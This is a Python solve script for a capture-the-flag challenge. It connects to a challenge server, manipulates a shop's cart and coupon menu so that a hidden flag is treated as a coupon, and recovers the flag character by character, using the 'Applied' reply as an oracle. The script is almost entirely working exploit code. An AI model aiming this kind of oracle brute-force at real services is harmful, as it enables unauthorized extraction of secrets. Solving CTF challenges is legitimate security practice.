import time
from sys import path
path.insert(0, '../..')
from connection import Socket

if __name__ == '__main__':
    LOAD_COUPONS, SHOW_CART, EDIT, FLAG_IDX, EDIT_LOAVES, EDIT_AMOUNT = '5\n', '4', '2', '2', '4', '3'
    flag, flag_len = [], 37
    printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$%&()*+,-.:<=>?@[]^_{|}"
    s = Socket("csa-2.csa-challenge.com", 2222)

    while len(flag) != flag_len:
        print("connecting...")
        for i in range(len(flag), flag_len):
            m = b''
            s.connect()
            # changing the amount of loaves (the length of the coupon)
            s.send('\n'.join((LOAD_COUPONS, EDIT, FLAG_IDX, EDIT_LOAVES)))
            s.send(str(i + 1))
            # changing the amount of items to 0 to make it a coupon
            s.send('\n'.join((EDIT, FLAG_IDX, EDIT_AMOUNT, '0', EDIT, FLAG_IDX)))

            curr = ''.join(flag)
            found = False
            for c in printable:
                coupon = curr + c
                m = s.send(f"5\n{coupon}")
                time.sleep(0.1)
                if b"Applied" in m:
                    found = True
                    flag.append(c)
                    s.close()
                    print(coupon)
                    break
            if not found:
                print("Failed!")
                flag = []
                break
    print("The flag is", ''.join(flag))
